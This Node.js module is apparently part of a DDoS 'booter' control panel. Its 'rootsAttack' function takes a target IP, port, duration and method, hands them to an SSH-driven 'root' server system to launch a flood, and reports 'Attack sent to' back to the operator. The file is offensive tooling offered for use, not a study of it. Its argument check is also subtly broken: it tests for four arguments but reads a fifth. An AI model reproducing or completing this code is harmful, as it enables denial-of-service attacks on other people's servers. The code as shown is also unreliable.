// Modules
const fs = require("fs");

// Files
const Banner = require("../banner_system/main.js");
const C = require("../Config/current.js");
const Extra = require("../Extra/main.js");
const roots = require("../root_system/main.js");

exports.rootsAttack = function(socket) {
    if((C.arg).length === 4) {
        roots.SendSSHCmd(C.arg[1], C.arg[2], C.arg[3], C.arg[4]);
        socket.write("            Attack sent to: " + C.arg[1] + ":" + C.arg[2] + " for " + C.arg[3] + " seconds with " + C.arg[4] + "\r\n");
    } else {
        socket.write("[x] Error, Invalid argument\r\nUsage: root <ip> <port> <time> <method>\r\nExample: root 70.70.70.72 80 30 TCP\r\n");
    }
    socket.write(Banner.ModifyBanner("help"));
    socket.write("\r\n" + Banner.ModifyBanner("hostname"));
    Extra.MoveCursorToLeft(31, socket);
    Extra.MoveCursorUp(1, socket);
}
